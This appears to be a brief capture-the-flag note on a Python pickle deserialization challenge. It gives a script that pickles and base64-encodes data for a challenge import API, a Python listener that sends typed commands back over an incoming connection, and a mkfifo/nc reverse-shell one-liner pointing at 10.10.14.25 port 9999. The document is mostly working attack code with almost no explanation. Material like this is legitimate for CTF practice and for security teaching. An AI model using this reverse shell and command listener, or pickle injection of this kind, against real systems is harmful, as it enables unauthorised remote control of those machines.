# python string attack
hint: deserialization


1. normal post:
```py
import pickle
import requests
import base64


def normal_usage(debug=True):
    '''
    this gets accepted by the import api
    '''
    print('normal layout:\n')
    url = 'http://ctf.adl.tw:12004/api/import'
    my_layout = [
        {'id': 'bocchi', 'left': 350, 'top': 180}
        
    ]
    print("typeof mylayout:",type(my_layout))
    my_layout=pickle.dumps(my_layout)
    my_layout=base64.b64encode(my_layout)
    my_layout=str(my_layout,'utf-8')
    print(my_layout)
    if debug:return
    myobj={'layout':my_layout}

    r = requests.post(url, json = myobj)
    
    return
```



2. how to listen to a port on windows
```py
import socket, sys, time

def listen(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    print("Listening on port " + str(port))
    conn, addr = s.accept()
    print('Connection received from ',addr)
    while True:
        #Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        command = input()

        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(1)

        #Remove the output of the "input()" function
        sys.stdout.write("\033[A" + ans.split("\n")[-1])

listen("127.0.0.1",8081)#port listen

```
3. reverse shell payload
```sh
mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.25 9999 >/tmp/f
```
